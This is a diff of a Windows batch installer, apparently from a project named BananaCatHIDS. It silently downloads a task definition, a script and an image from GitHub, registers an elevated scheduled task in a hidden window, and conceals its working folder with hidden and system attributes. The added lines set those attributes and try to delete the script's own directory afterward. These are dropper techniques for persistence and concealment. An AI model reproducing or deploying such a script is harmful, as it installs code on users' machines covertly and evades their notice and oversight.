@@ -15,8 +15,12 @@ set CAT_IMAGE_URI=https://raw.githubusercontent.com/vanos03/BananaCatHIDS/refs/h
 
 mkdir "%WORKDIR%" > nul 2>&1
 
-powershell -Command "Invoke-WebRequest -Uri "%TASK_OUT_URI%" -OutFile "%TASK_OUT%"" > nul 2>&1
+powershell -Command "Invoke-WebRequest -Uri "%TASK_OUT_URI%" -OutFile "%TASK_OUT%""  > nul 2>&1
 powershell -Command "Invoke-WebRequest -Uri "%CAT_SCRIPT_URI%" -OutFile "%CAT_SCRIPT_OUT%"" > nul 2>&1
-powershell -Command "Invoke-WebRequest -Uri "%CAT_IMAGE_URI%" -OutFile "%CAT_IMAGE_OUT%"" > nul 2>&1
+powershell -Command "Invoke-WebRequest -Uri "%CAT_IMAGE_URI%" -OutFile "%CAT_IMAGE_OUT%""  > nul 2>&1
 
-powershell Start-Process schtasks -ArgumentList '/Create', '/XML', '%TASK_OUT%', '/TN', '%TASK_NAME%' -Verb RunAs -WindowStyle Hidden > nul 2>&1
+attrib +h +s +r +i "%WORKDIR%" /S /D
+
+powershell Start-Process schtasks -ArgumentList '/Create', '/XML', '%TASK_OUT%', '/TN', '%TASK_NAME%' -Verb RunAs  -WindowStyle Hidden > nul 2>&1
+
+del %~dp0
